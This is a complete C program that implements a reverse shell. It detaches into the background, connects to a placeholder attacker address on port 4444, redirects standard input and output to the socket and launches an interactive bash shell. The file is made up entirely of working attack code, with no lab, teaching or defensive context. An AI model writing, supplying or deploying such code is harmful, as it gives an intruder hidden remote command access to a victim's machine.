#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    // 1. Background immediately
    if (fork() > 0) exit(0);
    setsid();

    // 2. Setup the connection
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444); // Port
    addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Your IP

    // 3. Connect (This is instant)
    connect(sock, (struct sockaddr *)&addr, sizeof(addr));

    // 4. Duplicate file descriptors (0=stdin, 1=stdout, 2=stderr)
    // This pipes the shell directly into the socket
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // 5. Execute shell
    execve("/bin/bash", (char *[]){"/bin/bash", "-i", NULL}, NULL);

    return 0;
}
